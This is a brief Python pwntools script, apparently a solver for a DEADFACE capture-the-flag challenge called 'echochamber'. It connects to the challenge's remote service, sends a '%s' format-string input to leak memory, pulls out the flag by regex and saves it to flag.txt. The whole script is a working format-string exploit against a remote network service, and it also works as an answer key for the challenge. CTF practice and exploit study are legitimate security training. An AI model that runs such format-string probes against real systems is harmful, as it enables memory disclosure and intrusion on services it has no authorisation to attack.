from pwn import *

io = remote('echochamber.deadface.io', 13337)

# simple fmstr on a blind remote

io.sendlineafter(b': ', b'%s')
data = io.recvregex(rb'deadface\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()